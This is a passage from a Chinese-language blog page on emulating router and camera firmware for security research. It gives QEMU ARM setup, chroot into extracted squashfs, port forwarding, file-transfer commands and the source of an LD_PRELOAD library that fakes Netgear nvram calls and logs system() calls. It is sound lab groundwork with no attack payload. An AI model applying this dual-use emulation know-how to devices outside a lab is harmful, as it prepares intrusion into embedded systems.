tap,ifname=tap0,script=no,downscript=no -nographic</span><br><span class="line"></span><br><span class="line"><span class="comment"># 下载地址</span></span><br><span class="line">https://people.debian.org/~aurel32/qemu/armel/</span><br></pre></td></tr></table></figure>
<ul>
<li>步骤</li>
</ul>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Ubuntu</span></span><br><span class="line"><span class="comment"># 1 拷贝至虚拟机、cd qemu_arm</span></span><br><span class="line"><span class="comment"># 2 创建虚拟网卡tap0，分配IP</span></span><br><span class="line">sudo tunctl -t tap0 -u `whoami`</span><br><span class="line">sudo ifconfig tap0 10.10.10.1/24</span><br><span class="line"><span class="comment"># 3 启动</span></span><br><span class="line">./run.sh</span><br><span class="line"></span><br><span class="line"><span class="comment"># qemu_arm</span></span><br><span class="line"><span class="comment"># 4 登录，root-root</span></span><br><span class="line">debian-armhf login: root</span><br><span class="line">Password:</span><br><span class="line"><span class="comment"># 5 配置网卡IP、检测连通性</span></span><br><span class="line">ifconfig eth0 10.10.10.2/24</span><br><span class="line">ping 10.10.10.1</span><br><span class="line"><span class="comment"># 6 拷贝文件系统至qemu_arm</span></span><br><span class="line">scp+tar、wget+pyhttpd</span><br><span class="line"><span class="comment"># 7 挂载（先拷文件系统！）</span></span><br><span class="line">mount -t proc /proc ./squashfs-root/proc</span><br><span class="line">mount -o <span class="built_in">bind</span> /dev ./squashfs-root/dev</span><br><span class="line"><span class="comment"># 8 chroot并启动sh</span></span><br><span class="line">chroot ./squashfs-root/ sh</span><br><span class="line"></span><br><span class="line"><span class="comment"># 注意：忘记mount后，命令执行会出问题，如ps</span></span><br><span class="line"><span class="comment"># 若虚拟机重启，有可能需要重新mount和ifconfig</span></span><br></pre></td></tr></table></figure>
<h1 id="02-qemu-user"><a href="#02-qemu-user" class="headerlink" title="02-qemu-user"></a>02-qemu-user</h1><ul>
<li><a href="https://www.anquanke.com/post/id/217606" target="_blank" rel="noopener">https://www.anquanke.com/post/id/217606</a></li>
</ul>
<h1 id="03-armx"><a href="#03-armx" class="headerlink" title="03-armx"></a>03-armx</h1><h1 id="04-其它"><a href="#04-其它" class="headerlink" title="04-其它"></a>04-其它</h1><h2 id="端口转发"><a href="#端口转发" class="headerlink" title="端口转发"></a>端口转发</h2><ul>
<li>本地端口转发</li>
</ul>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1 mac、ssh（源、目的、中间</span></span><br><span class="line">ssh -L 9000:192.168.100.2:80 root@192.168.142.182</span><br><span class="line">http://127.0.0.1:9000</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2 Windows、xshell</span></span><br><span class="line"><span class="comment"># https://blog.csdn.net/qq_34039315/article/details/77510923</span></span><br><span class="line"><span class="comment"># 右键属性、隧道、添加、类型是本地（拔出）</span></span><br><span class="line"><span class="comment"># 通过此中间主机，将目标转到源</span></span><br><span class="line">源主机：localhost</span><br><span class="line">侦听端口：9000</span><br><span class="line">目标主机：192.168.100.2</span><br><span class="line">目标端口：80</span><br><span class="line"></span><br><span class="line"><span class="comment"># udp端口不能通过ssh来转发，因为其基于tcp，要用其它工具</span></span><br></pre></td></tr></table></figure>
<h2 id="文件传输"><a href="#文件传输" class="headerlink" title="文件传输"></a>文件传输</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1 tar + scp</span></span><br><span class="line">tar -zcvf 1.tar.gz squashfs-root/</span><br><span class="line">scp 1.tar.gz root@10.10.10.2:/root</span><br><span class="line">tar -zxvf 1.tar.gz</span><br><span class="line"><span class="comment"># 2 pyhttpd + wget</span></span><br><span class="line">python3 -m http.server</span><br><span class="line">python2 -m SimpleHTTPServer</span><br><span class="line">wget http://10.10.10.1:8000/1.tar.gz</span><br><span class="line"><span class="comment"># 3 tftp + win7服务端</span></span><br><span class="line">./busybox-armv4tl tftp -p -l funjsq_log_level 192.168.1.3</span><br><span class="line"><span class="comment"># 4 mount + nfs</span></span><br><span class="line">- mac服务端：sudo vim /etc/exports：/Users/lxl/Public/4share -alldirs -network 192.168.55.0 -mask 255.255.255.0（默认就是rw权限，如果只读，则-ro）、nfsd status/<span class="built_in">enable</span>/start</span><br><span class="line">- 摄像头客户端：mount -t nfs 192.168.55.153:/Users/lxl/Public/nfs_share /home -o nolock</span><br><span class="line">- 客户端向外传文件：touch: 111: Permission denied（没权限，cp命令也如此），直接把nfs服务端的目录权限设为777</span><br><span class="line"><span class="comment"># 5</span></span><br></pre></td></tr></table></figure>
<h2 id="技巧"><a href="#技巧" class="headerlink" title="技巧"></a>技巧</h2><ul>
<li>ps看是否有telnetd或sshd</li>
<li>原生busybox支持命令少，可自行上传，如<code>/tmp/busybox-armv7l netstat -atp</code></li>
</ul>
<h1 id="05-修复运行依赖"><a href="#05-修复运行依赖" class="headerlink" title="05-修复运行依赖"></a>05-修复运行依赖</h1><h2 id="LD-PRELOAD劫持符号链接"><a href="#LD-PRELOAD劫持符号链接" class="headerlink" title="LD_PRELOAD劫持符号链接"></a>LD_PRELOAD劫持符号链接</h2><ul>
<li>custom_nvram</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 源码 https://github.com/therealsaumil/custom_nvram、https://raw.githubusercontent.com/therealsaumil/custom_nvram/master/custom_nvram_r6250.c</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* custom_nvram.c</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Emulates the Netgear 6250/6400's nvram functions</span></span><br><span class="line"><span class="comment"> * by reading key=value pairs from /tmp/nvram.ini</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * by Saumil Shah</span></span><br><span class="line"><span class="comment"> * @therealsaumil</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;dlfcn.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ./buildroot-2016.11.2/output/host/usr/bin/arm-buildroot-linux-uclibcgnueabi-gcc -shared -fPIC -o nvram.so nvram.c</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NVRAM_FILE      <span class="meta-string">"/tmp/nvram.ini"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NVRAM_ENTRIES   2000</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NVRAM_KEYLEN    128</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NVRAM_LINE      256</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> counter = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> nvram_init = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> nvram_entries = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// inefficient and crude key value pair array</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">char</span> key[NVRAM_ENTRIES][NVRAM_KEYLEN];</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">char</span> value[NVRAM_ENTRIES][NVRAM_KEYLEN];</span><br><span class="line"></span><br><span class="line"><span class="comment">// function declarations</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">custom_nvram_init</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">read_nvram</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="title">int</span> <span class="params">(*real_system)</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *command)</span> </span>= <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">static</span> FILE *(*real_fopen)(<span class="keyword">const</span> <span class="keyword">char</span> *filename, <span class="keyword">const</span> <span class="keyword">char</span> *mode) = <span class="literal">NULL</span>;</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="title">int</span> <span class="params">(*real_open)</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *pathname, <span class="keyword">int</span> flags)</span> </span>= <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// function will be called only once when any of the acosNvram_* functions get</span></span><br><span class="line"><span class="comment">// invoked</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">custom_nvram_init</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   nvram_init = <span class="number">1</span>;</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">"custom_nvram initialised\n"</span>);</span><br><span class="line">   nvram_entries = read_nvram();</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">"Read %d entries from %s\n"</span>, nvram_entries, NVRAM_FILE);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// function to read the nvram.ini file into</span></span><br><span class="line"><span class="comment">// a global array</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">read_nvram</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">   FILE *fp;</span><br><span class="line">   <span class="keyword">char</span> line[NVRAM_LINE], *k, *v;</span><br><span class="line"></span><br><span class="line">   fp = fopen(NVRAM_FILE, <span class="string">"r"</span>);</span><br><span class="line">   <span class="keyword">if</span>(fp == (FILE *) <span class="literal">NULL</span>) &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"Cannot open %s\n"</span>, NVRAM_FILE);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">while</span>(!feof(fp)) &#123;</span><br><span class="line">      fgets(line, NVRAM_LINE, fp);</span><br><span class="line">      k = strtok(line, <span class="string">"="</span>);</span><br><span class="line">      v = strtok(<span class="literal">NULL</span>, <span class="string">"\n"</span>);</span><br><span class="line">      <span class="built_in">memset</span>(key[i], <span class="string">'\0'</span>, NVRAM_KEYLEN);</span><br><span class="line">      <span class="built_in">memset</span>(value[i], <span class="string">'\0'</span>, NVRAM_KEYLEN);</span><br><span class="line">      <span class="keyword">if</span>(k != <span class="literal">NULL</span>)</span><br><span class="line">         <span class="built_in">strncpy</span>(key[i], k, NVRAM_KEYLEN - <span class="number">1</span>);</span><br><span class="line">      <span class="keyword">if</span>(v != <span class="literal">NULL</span>)</span><br><span class="line">         <span class="built_in">strncpy</span>(value[i], v, NVRAM_KEYLEN - <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"[nvram %d] %s = %s\n"</span>, i, key[i], value[i]);</span><br><span class="line">      i++;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span>(i &gt;= NVRAM_ENTRIES) &#123;</span><br><span class="line">         <span class="built_in">printf</span>(<span class="string">"** WARNING: nvram entries exceeds %d\n"</span>, NVRAM_ENTRIES);</span><br><span class="line">         <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   fclose(fp);</span><br><span class="line">   <span class="keyword">return</span>(i);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">char</span> *<span class="title">nvram_get</span><span class="params">(<span class="keyword">char</span> *k)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   <span class="keyword">char</span> *v = <span class="string">""</span>;</span><br><span class="line">   <span class="keyword">int</span> i;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; nvram_entries; i++) &#123;</span><br><span class="line">      <span class="keyword">if</span>(<span class="built_in">strcmp</span>(key[i], k) == <span class="number">0</span>) &#123;</span><br><span class="line">         <span class="comment">//v = strdup(value[i]);</span></span><br><span class="line">         v = value[i];</span><br><span class="line">         <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">return</span>(v);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">nvram_set</span><span class="params">(<span class="keyword">char</span> *k, <span class="keyword">char</span> *v)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   <span class="keyword">int</span> i;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; nvram_entries; i++) &#123;</span><br><span class="line">      <span class="keyword">if</span>(<span class="built_in">strcmp</span>(key[i], k) == <span class="number">0</span>) &#123;</span><br><span class="line">         <span class="built_in">strncpy</span>(value[i], v, NVRAM_KEYLEN - <span class="number">1</span>);</span><br><span class="line">         <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">return</span>(i);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// hook system()</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">system</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *command)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   <span class="keyword">int</span> r;</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">"[0x%08x] "</span>, __builtin_return_address(<span class="number">0</span>));  <span class="comment">// get caller's address</span></span><br><span class="line">   real_system = dlsym(RTLD_NEXT, <span class="string">"system"</span>);</span><br><span class="line">   r = real_system(command);</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">"system('%s') = %d\n"</span>, command, r);</span><br><span class="line">   <span class="keyword">return</span>(r);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// hook fopen()</span></span><br><span class="line"><span class="function">FILE *<span class="title">fopen</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *filename, <span class="keyword">const</span> <span class="keyword">char</span> *mode)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   FILE *fp;</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">"[0x%08x] "</span>, __builtin_return_address(<span class="number">0</span>));  <span class="comment">// get caller's address</span></span><br><span class="line">   real_fopen = dlsym(RTLD_NEXT, <span class="string">"fopen"</span>);</span><br><span class="line">   fp = real_fopen(filename, mode);</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">"fopen('%s', '%s') = 0x%08x\n"</span>, filename, mode, (<span class="keyword">unsigned</span> <span class="keyword">int</span>) fp);</span><br><span class="line">   <span class="keyword">return</span>(fp);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// hook open()</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">open</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *pathname, <span class="keyword">int</span> flags)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   <span class="keyword">int</span> r;</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">"[0x%08x] "</span>, __builtin_return_address(<span class="number">0</span>));  <span class="comment">// get caller's address</span></span><br><span class="line">   real_open = dlsym(RTLD_NEXT, <span class="string">"open"</span>);</span><br><span class="line">   r = real_open(pathname, flags);</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">"open('%s', %d) = %d\n"</span>, pathname, flags, r);</span><br><span class="line">   <span class="keyword">return</span>(r);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* intercepted libnvram.so functions */</span></span><br><span class="line"><span class="function"><span class="keyword">char</span> *<span class="title">acosNvramConfig_get</span><span class="params">(<span class="keyword">char</span> *k)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   <span class="keyword">char</span> *v = <span class="string">""</span>;</span><br><span class="line"></span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">"[0x%08x] "</span>, __builtin_return_address(<span class="number">0</span>));  <span class="comment">// get caller's address</span></span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span>(!nvram_init)</span><br><span class="line">      custom_nvram_init();</span><br><span class="line"></span><br><span class="line">   v = nvram_get(k);</span><br><span class="line"></span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">"acosNvramConfig_get('%s') = '%s'\n"</span>, k, v);</span><br><span class="line">   <span class="keyword">return</span>(v);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">acosNvramConfig_set</span><span class="params">(<span class="keyword">char</span> *k, <span class="keyword">char</span> *v)</span> </span>&#123;</span><br><span class="line">   <span class="keyword">int</span> i;</span><br><span class="line"></span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">"[0x%08x] "</span>, __builtin_return_address(<span class="number">0</span>));  <span class="comment">// get caller's address</span></span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span>(!nvram_init)</span><br><span class="line">      custom_nvram_init();</span><br><span class="line"></span><br><span class="line">   i = nvram_set(k, v);</span><br><span class="line"></span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">"[nvram %d] acosNvramConfig_set('%s', '%s')\n"</span>, i, k, v);</span><br><span class="line">   <span class="keyword">return</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">acosNvramConfig_read</span><span class="params">(<span class="keyword">char</span> *k, <span class="keyword">char</span> *r, <span class="keyword">int</span> len)</span> </span>&#123;</span><br><span class="line">   <span class="keyword">char</span>* v = <span class="string">""</span>;</span><br><span class="line"></span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">"[0x%08x] "</span>, __builtin_return_address(<span class="number">0</span>));  <span class="comment">// get caller's address</span></span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span>(!nvram_init)</span><br><span class="line">      custom_nvram_init();</span><br><span class="line"></span><br><span class="line">   v = nvram_get(k);</span><br><span class="line"></span><br><span class="line">   <span class="built_in">strncpy</span>(r, v, len);</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">"acosNvramConfig_read('%s', '%s', %d)\n"</span>, k, r, len);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">acosNvramConfig_match</span><span class="params">(<span class="keyword">char</span> *k, <span class="keyword">char</span> *v)</span> </span>&#123;</span><br><span class="line">   <span class="comment">// return 0 (False) by default</span></span><br><span class="line">   <span class="keyword">int</span> r = <span class="number">0</span>;</span><br><span class="line">   <span class="keyword">char</span> *s;</span><br><span class="line"></span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">"[0x%08x] "</span>, __builtin_return_address(<span class="number">0</span>));  <span class="comment">// get caller's address</span></span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span>(!nvram_init)</span><br><span class="line">      custom_nvram_init();</span><br><span class="line"></span><br><span class="line">   s = nvram_get(k);</span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span>(<span class="built_in">strcmp</span>(s, v) == <span class="number">0</span>)</span><br><span class="line">      r = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">"acosNvramConfig_match('%s', '%s') = %d\n"</span>, k, v, r);</span><br><span class="line">   <span class="keyword">return</span>(r);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* intercepted other libacos_shared.so functions */</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">agApi_fwServiceAdd</span><span class="params">(<span class="keyword">char</span> *k, <span class="keyword">int</span> a, <span class="keyword">int</span> b, <span class="keyword">int</span> c)</span> </span>&#123;</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">"[0x%08x] "</span>, __builtin_return_address(<span class="number">0</span>));  <span class="comment">// get caller's address</span></span><br><span class="line">   counter++;</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">"agApi_fwServiceAdd('%s', %d, %d, %d) = %d\n"</span>, k, a, b, c, counter);</span><br><span class="line">   <span class="keyword">return</span>(counter);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">agApi_fwURLFilterEnableTmSch_Session2</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">"[0x%08x] "</span>, __builtin_return_address(<span class="number">0</span>));  <span class="comment">// get caller's address</span></span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">"agApi_fwURLFilterEnableTmSch_Session2(%d) = 0\n"</span>, x);</span><br><span class="line">   <span class="keyword">return</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">agApi_fwURLFilterEnable_Session2</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">"[0x%08x] 